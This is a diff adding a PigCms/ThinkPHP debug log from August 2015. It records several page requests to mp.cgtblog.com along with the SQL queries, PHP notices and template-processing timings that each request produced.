@@ -1,0 +1,1278 @@
+[ 2015-08-22T07:17:14+08:00 ] 121.42.0.38 /
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.112305s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.003906s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.003906s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.035156s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.053711s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.013672s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.023438s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.009766s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.079101s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.024415s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.009765s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.448243s ]
+INFO: [ view_template ] --END-- [ RunTime:0.040039s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.488282s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.123046s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.611328s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.613282s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.625000s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.625977s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.016602s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.627930s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001953s ]
+
+[ 2015-08-22T22:23:31+08:00 ] 121.42.0.38 /index.php
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000976s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.035156s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.022460s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.015625s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.016602s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.021484s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.040039s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.010742s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.009766s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.247071s ]
+INFO: [ view_template ] --END-- [ RunTime:0.028320s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.275391s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.067383s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.343750s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.344727s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.346680s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.347657s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005860s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.349610s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001953s ]
+
+[ 2015-08-22T22:23:51+08:00 ] 121.42.0.38 /index.php?edition-compare-1
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004882s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002929s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.001953s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.001953s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000977s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.056640s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000977s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.058593s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.032227s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.090820s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.091796s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.092773s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.092773s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002930s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.093750s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000976s ]
+
+[ 2015-08-22T22:23:59+08:00 ] 121.42.0.38 /?tools-products.html
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001953s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002929s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002929s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.039062s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001954s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.041016s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.031250s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.072266s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.073242s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.073242s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.074219s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.074219s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000976s ]
+
+[ 2015-08-22T22:24:02+08:00 ] 121.42.0.38 /?product-gnotify
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.002930s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.002929s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.002930s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.003907s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.043945s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000977s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.044922s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.031250s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.076172s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.076172s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.077148s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.077148s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.078125s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000976s ]
+
+[ 2015-08-22T22:24:43+08:00 ] 121.42.0.38 /index.php
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.003906s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000977s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.001953s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_renew` [ RunTime:0.001953s ]
+SQL: SHOW COLUMNS FROM `tp_banners` [ RunTime:0.001953s ]
+SQL: SHOW COLUMNS FROM `tp_case` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_renew` WHERE ( `agentid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_banners` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC  [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_case` WHERE ( `status` = 1 ) AND ( `agentid` = 0 ) ORDER BY id DESC LIMIT 10   [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_news` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_news` WHERE ( `agentid` = 0 ) LIMIT 1   [ RunTime:0.000976s ]
+SQL: SHOW COLUMNS FROM `tp_img` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_img` WHERE ( `classid` = 0 ) ORDER BY id DESC LIMIT 5   [ RunTime:0.000000s ]
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.041016s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001953s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Use of undefined constant uid - assumed 'uid' D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+NOTIC: [8] Undefined index: uid D:\website\cgtblogpigcmsSpecial\Conf\logs\Cache\Home\e8edd32bcbb2d7ab2f0f8d14c550c52b.php 第 94 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.042969s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.033203s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.077148s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.078125s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.078125s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.079101s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002930s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.080078s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000977s ]
+
+[ 2015-08-22T22:24:45+08:00 ] 121.42.0.38 /
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000977s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000977s ]
+SQL: SHOW COLUMNS FROM `tp_agent` [ RunTime:0.004883s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
+NOTIC: [8] Undefined index: mp.cgtblog.comnomsite D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 38 行.
+SQL: SHOW COLUMNS FROM `tp_mobilesite` [ RunTime:0.001953s ]
+NOTIC: [8] Undefined index: mp.cgtblog.com D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 380 行.
+SQL: SELECT * FROM `tp_mobilesite` WHERE ( `owndomain` = 'mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000000s ]
+SQL: SELECT * FROM `tp_agent` WHERE ( `siteurl` = 'http://mp.cgtblog.com' ) LIMIT 1   [ RunTime:0.000976s ]
+NOTIC: [8] Constant STATICS already defined D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\BaseAction.class.php 第 128 行.
+SQL: SHOW COLUMNS FROM `tp_images` [ RunTime:0.002930s ]
+SQL: SELECT * FROM `tp_images` LIMIT 1   [ RunTime:0.000000s ]
+NOTIC: [8] Undefined index: showNotice D:\website\cgtblogpigcmsSpecial\PigCms\Lib\Action\Home\IndexAction.class.php 第 56 行.
+SQL: SHOW COLUMNS FROM `tp_links` [ RunTime:0.002929s ]
+SQL: SELECT * FROM `tp_links` WHERE ( `status` = 1 ) AND ( `agentid` = 0 )  [ RunTime:0.000000s ]
